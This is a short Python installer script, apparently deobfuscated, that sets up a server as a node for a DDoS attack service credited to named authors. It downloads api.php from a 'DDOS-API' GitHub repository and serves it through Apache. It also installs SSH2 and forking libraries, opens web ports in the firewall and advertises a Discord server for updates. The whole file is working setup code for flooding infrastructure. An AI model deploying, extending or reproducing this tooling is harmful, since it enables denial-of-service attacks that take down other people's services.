import os
import subprocess
import time

# Decoded strings
important = 'Created By @slippersyo and @dirtystress'
apidl = 'https://raw.githubusercontent.com/samual1337/DDOS-API/master/api.php'
discord = 'https://discord.gg/j964XYu'

# Download the API
subprocess.run(['wget', apidl])

# Clear the screen
os.system('clear')

# Print important message and Discord server link
print(important)
print('All updated files are dropped in the Discord server: ' + discord)

# Pause for a moment
time.sleep(3)

# Clear the screen
os.system('clear')

# Print message
print('Preparing Node')

# Pause for a moment
time.sleep(1)

# Clear the screen
os.system('clear')

# Install required packages
os.system('yum install python-requests php screen httpd -y')

# Move API file to web directory
os.system('mv api.php /var/www/html')

# Update system
os.system('yum update -y')

# Add firewall rules
os.system('iptables -A INPUT -p tcp -m tcp --dport 80 -j ACCEPT')
os.system('iptables -A INPUT -p tcp -m tcp --dport 443 -j ACCEPT')

# Compile system
os.system('yum install gcc cpan php-pear php-devel libssh2 libssh2-devel -y')
os.system('pecl install -f ssh2')
os.system('echo "extension=ssh2.so" > /etc/php.d/ssh2.ini')
os.system('cpan -fi Net::SSH2')
os.system('cpan -fi Parallel::ForkManager')

# Clean up
os.system('rm -f api.php')
os.system('clear')

# Print final message
print('Finished!')
input('Press ENTER to exit')
